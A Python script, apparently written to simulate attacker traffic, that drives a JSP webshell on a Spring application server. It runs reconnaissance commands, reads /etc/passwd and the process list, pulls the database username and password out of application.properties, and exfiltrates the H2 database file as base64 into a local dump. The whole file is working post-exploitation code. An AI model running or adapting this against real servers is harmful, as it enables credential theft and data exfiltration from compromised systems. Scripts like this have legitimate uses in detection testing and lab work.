import requests
import sys
import json
from time import sleep

def format_list(list):
    formatted = list.split('\n')
    return formatted

def execute_command(url, cmd):
    request = requests.get(url, params={"cmd": cmd})
    return request.text.replace('\x00', '').strip()

def perform_reconnaissance(url):
    dbname_placeholder = "spring.datasource.username="
    dbpass_placeholder = "spring.datasource.password="
    db_placeholder = "spring.datasource.url="
    recon_data = {}
    recon_data.update({"os": execute_command(url, "uname -a")})
    recon_data.update({"workdir": execute_command(url, "pwd")})
    recon_data.update({"user": execute_command(url, "id")})
    recon_data.update({"passwd": format_list(execute_command(url, "cat /etc/passwd"))})
    recon_data.update({"processes": execute_command(url, "ps aux")})
    recon_data.update({"application.properties": format_list(execute_command(url, "cat src/main/resources/application.properties"))})
    for property in recon_data.get("application.properties"):
        if dbname_placeholder in property:
            recon_data.update({"dbname": property[len(dbname_placeholder):] })
        if dbpass_placeholder in property:
            recon_data.update({"dbpass": property[len(dbpass_placeholder):] })
        if db_placeholder in property:
            recon_data.update({"db": property[len(db_placeholder):]})
    return recon_data

def extract_db_file(url, recon_data):
    workdir = recon_data.get("workdir").strip("/")
    workdir = "/" + workdir.strip()
    file_name = recon_data.get("db").strip()
    file_name = file_name[file_name.index("/"):]+".mv.db"
    file_location = workdir+file_name
    file_contents = execute_command(url, "base64 " + file_location).strip("//")
    with open ("db_dump.txt", "w") as f:
        f.write(file_contents)

def main():
    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print("Program expects a url as an argument. \nUsage: python3 simulate_attacker_traffic.py <url/to/jsp> <repeat_times (optional)>")
        sys.exit(1)
    webshell_url = sys.argv[1]
    if len(sys.argv) == 3 and sys.argv[2].isdigit() and int(sys.argv[2]) > 1:
        repeat = int(sys.argv[2])
    else:
        repeat = 1
    r = requests.get(webshell_url, params={"cmd": "id"})
    if r.status_code != 200 or r.text.find("DOCTYPE") != -1:
        print("Provided url seems invalid. Please try again...")
        sys.exit(1)
    else:
        print("Webshell located, performing attack")
    try:
        for i in range(repeat):
            print("[*] Performing reconnaissance")
            recon_data = perform_reconnaissance(webshell_url)
            if recon_data.get("db").index("file") != 0:
                print("[*] Performing db file extraction")
                extract_db_file(webshell_url, recon_data)
            sleep(1)
    except:
        print("There was an error while executing the attack. Exiting...")
        sys.exit(1)
    print("Printing reconnaissance data:")
    print(json.dumps(recon_data, indent=2))
    print("DB dump can be found db_dump.txt (base64 encoded)")

if __name__ == '__main__':
    main()